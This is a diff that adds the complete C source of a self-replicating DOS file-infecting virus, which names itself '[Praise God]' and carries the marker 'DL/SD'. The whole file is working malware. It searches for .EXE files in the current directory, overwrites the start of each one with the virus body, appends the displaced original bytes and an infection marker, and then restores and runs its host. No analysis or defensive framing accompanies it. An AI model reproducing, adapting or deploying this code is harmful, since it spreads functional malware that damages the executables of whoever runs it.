@@ -1,0 +1,69 @@
+#include <io.h>
+#include <stdio.h>
+#include <process.h>
+#include <fcntl.h>
+#include <dir.h>
+
+#define VirSize	(3577+1)
+#define LenID	(5+1)
+
+/* Structure */
+struct ffblk ff;
+
+/* Variables */
+char Buffer1[VirSize], Buffer2[VirSize], Tmp[LenID];
+
+int handle1, attr, attr2, status;
+char* Author = "Ding Lik of  Shadow Dancer";
+char* VirName = "[Praise God]";
+char* VirID = "DL/SD";
+
+/* Main virus program */
+void main(int argc, char *argv[])
+{
+ /* *argv equal to ParamStr(0) in Turbo Pascal */
+ attr = _chmod(*argv, 0);
+ _chmod(*argv, 1, 0);
+ handle1 = _open(*argv, O_RDWR);
+ _read(handle1, Buffer1, VirSize-1); /* Read virus in this file */
+ _close(handle1);
+
+ status = findfirst("*.EXE", &ff, 0x27);
+ while (status == 0)
+ {
+  attr2 =_chmod(ff.ff_name, 0);
+  _chmod(ff.ff_name, 1, 0);
+  handle1 = _open(ff.ff_name, O_RDWR);
+  lseek(handle1, ff.ff_fsize - LenID, SEEK_SET);
+  _read(handle1, Tmp, LenID);
+  if ((strcmp(VirID, Tmp)) != 0)
+  {
+  lseek(handle1, 0L, SEEK_SET);
+  _read(handle1, Buffer2, VirSize-1);
+  lseek(handle1, filelength(handle1), SEEK_SET);
+  _write(handle1, Buffer2, VirSize-1);
+  _write(handle1, VirID, LenID);
+  lseek(handle1, 0L, SEEK_SET);
+  _write(handle1, Buffer1, VirSize-1);
+  }
+  _close(handle1);
+  _chmod(ff.ff_name, 1, attr2);
+  status = findnext(&ff);
+  }
+
+ handle1 = _open(*argv, O_RDWR);
+ /* Point to original bytes */
+ lseek(handle1, (long) filelength(handle1) - VirSize - LenID + 1, SEEK_SET);
+ /* Read them */
+ _read(handle1, Buffer2, VirSize-1);
+ /* Goto the beginning of prog */
+ lseek(handle1, 0, SEEK_SET);
+ /* Write original bytes */
+ _write(handle1, Buffer2, VirSize-1);
+ system(*argv); /* Launch it */
+
+ lseek(handle1, 0, SEEK_SET); /* Goto the beginning of prog */
+ _write(handle1, Buffer1, VirSize-1); /* Write virus */
+ _close(handle1); /* Close it */
+ _chmod(*argv, 1, attr);
+}
